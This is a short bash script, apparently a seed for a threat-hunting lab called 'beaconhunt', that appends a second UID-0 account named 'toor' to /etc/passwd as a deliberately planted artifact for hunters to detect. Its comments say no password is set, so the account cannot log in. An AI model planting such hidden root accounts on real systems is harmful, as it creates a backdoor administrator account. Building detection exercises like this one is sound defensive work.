#!/usr/bin/env bash
# Declawed plant: a second UID-0 account in /etc/passwd (a hidden root).
# No password is set in /etc/shadow, so it is not a usable login — but it is
# the exact /etc/passwd modification a hunter looks for.
set -euo pipefail
if ! grep -q '^toor:' /etc/passwd; then
  echo 'toor:x:0:0:beaconhunt backup:/root:/bin/bash' >> /etc/passwd
fi
echo "added UID-0 account 'toor' to /etc/passwd"
